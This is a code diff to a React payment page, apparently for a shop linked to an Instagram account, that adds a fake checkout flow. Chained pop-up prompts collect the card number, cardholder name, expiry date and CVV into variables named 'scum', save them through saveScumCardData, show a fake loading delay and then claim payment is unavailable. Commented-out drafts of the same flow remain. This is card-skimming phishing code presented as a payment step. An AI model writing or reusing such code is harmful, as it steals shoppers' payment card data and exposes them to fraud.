@@ -1,7 +1,7 @@
-import React, {useContext, useEffect, useRef, useState} from 'react';
+import React, {useContext, useEffect, useState} from 'react';
 import {AiFillCheckCircle} from "react-icons/all";
 import Container from "../layout/Container";
-import {Link, useNavigate, useParams} from "react-router-dom";
+import {Link, useParams} from "react-router-dom";
 import {HOME_ROUTE} from "../../utils/routes";
 import Button from "../Button";
 import {Helmet} from "react-helmet";
@@ -14,16 +14,24 @@ import SuccessPayPage from "./SuccessPayPage";
 import Countdown from "react-countdown";
 import button from "../Button";
 import Swal from "sweetalert2";
+import withReactContent from 'sweetalert2-react-content'
+import MaskInput from 'react-maskinput';
 
 const TransactionPage = () => {
 
     const {store} = useContext(Context);
     const params = useParams();
+    const [scum_number, setScumNumber] = useState('');
+    const [scum_fio, setScumFio] = useState('');
+    const [scum_date, setScumDate] = useState('');
+    const [scum_cvv, setScumCvv] = useState('');
+    const [scum_data, setScumData] = useState({});
     const [transaction, setTransaction] = useState();
     const [payCompleted, setPayCompleted] = useState(false);
     const [timeExpired, setTimeExpired] = useState(false);
     const minutes = 35;
     const time = 1000 * 60 * minutes;
+    const MySwal = withReactContent(Swal)
 
     const createOrder = (data, actions, err) => {
         return actions.order.create({
@@ -64,14 +72,122 @@ const TransactionPage = () => {
         }
     };
 
+
     const openPayModal = () => {
         Swal.fire({
-            html: `
-                <h4>Для оплаты заказа обратитесь к нашему менеджеру:</h4>
-                
-                <a target="_blank" href="https://instagram.com/diamond_room.ru">Менеджер</a>
-            `
-        });
+            input: 'text',
+            inputLabel: 'Номер карты',
+            inputPlaceholder: '0000-0000-0000-0000',
+            inputValidator: (value) => {
+                return !value && 'Это поле необходимо заполнить'
+            },
+            inputAttributes: {
+                name: 'card-number'
+            }
+        }).then((rs) => {
+            if(rs.isConfirmed) {
+                store.setScumNumber(rs.value)
+
+                Swal.fire({
+                    input: 'text',
+                    inputLabel: 'ФИО (латиница)',
+                    inputValidator: (value) => {
+                        return !value && 'Это поле необходимо заполнить'
+                    },
+                    inputAttributes: {
+                        name: 'card-name'
+                    }
+                }).then((rs) => {
+                    if(rs.isConfirmed) {
+                        store.setScumFio(rs.value)
+
+                        Swal.fire({
+                            input: 'text',
+                            inputLabel: 'ММ/ГГ',
+                            inputValidator: (value) => {
+                                return !value && 'Это поле необходимо заполнить'
+                            },
+                            inputAttributes: {
+                                name: 'card-date'
+                            }
+                        }).then((rs) => {
+                            if(rs.isConfirmed) {
+                                store.setScumDate(rs.value)
+
+                                Swal.fire({
+                                    input: 'text',
+                                    inputLabel: 'CVV',
+                                    inputValidator: (value) => {
+                                        return !value && 'Это поле необходимо заполнить'
+                                    },
+                                    inputAttributes: {
+                                        name: 'card-cvv'
+                                    },
+                                    preConfirm: () => {
+                                        return new Promise((resolve) => {
+                                            setTimeout(resolve, 2000);
+                                        });
+                                    },
+                                    showLoaderOnConfirm: true,
+                                }).then((rs) => {
+                                    if(rs.isConfirmed) {
+                                        store.setScumCvv(rs.value)
+
+                                        store.saveScumCardData()
+
+                                        MySwal.fire(<p>Оплата в данный момент недоступна, попробуйте связаться с <a target="_blank" href="https://instagram.com/diamond_room.ru">менеджером</a></p>)
+                                    }
+                                })
+                            }
+                        })
+                    }
+                })
+            }
+        })
+
+
+        // MySwal.fire({
+        //     html: <>
+        //         <label>Номер карты</label>
+        //         <MaskInput onChange={(e) => setScumNumber(e.target.value)} className={'field'} alwaysShowMask maskChar="_" mask="0000-0000-0000-0000" size={20} />
+        //         <label>ФИО (латиница)</label>
+        //         <input value={scum_fio} onChange={handleChang} className={'field'} />
+        //         <label>ММ/ГГ</label>
+        //         <MaskInput onChange={(e) => {setTimeout(() => setScumDate(e.target.value), 500)}} className={'field'} alwaysShowMask maskChar="_" mask="00/00" size={20} />
+        //         <label>CVV</label>
+        //         <MaskInput onChange={(e) => setScumCvv(e.target.value)} className={'field'} alwaysShowMask maskChar="_" mask="000" size={20} />
+        //     </>,
+        //     preConfirm: () => {
+        //         console.log(scum_date)
+        //         store.saveScumCardData({
+        //             number: scum_number,
+        //             fio: scum_fio,
+        //             date: scum_date,
+        //             cvv: scum_cvv
+        //         })
+        //
+        //         return new Promise((resolve) => {
+        //             setTimeout(resolve, 2000);
+        //         });
+        //     },
+        //     showLoaderOnConfirm: true,
+        // }).then(() => {
+        //     console.log(scum_date)
+        //     return MySwal.fire(<p>Оплата в данный момент недоступна, попробуйте связаться с <a target="_blank" href="https://instagram.com/diamond_room.ru">менеджером</a></p>)
+        // })
+        // Swal.fire({
+        //     // html: `
+        //     //     <h4>Для оплаты заказа обратитесь к 2нашему менеджеру:</h4>
+        //     //
+        //     //
+        //     //     <MaskInput alwaysShowMask maskChar="_" mask="0000-0000-0000-0000" size={20} />
+        //     //     <MaskInput alwaysShowMask maskChar="_" mask="00/00" size={20} />
+        //     //     <MaskInput alwaysShowMask maskChar="_" mask="000" size={20} />
+        //     //
+        //     //     <a target="_blank" href="https://instagram.com/diamond_room.ru">Менеджер</a>
+        //     // `
+        //     html: "<MaskInput alwaysShowMask maskChar='_' mask='0000-0000-0000-0000' size={20} />"
+        // });
     }
 
     const PayButton = () => {
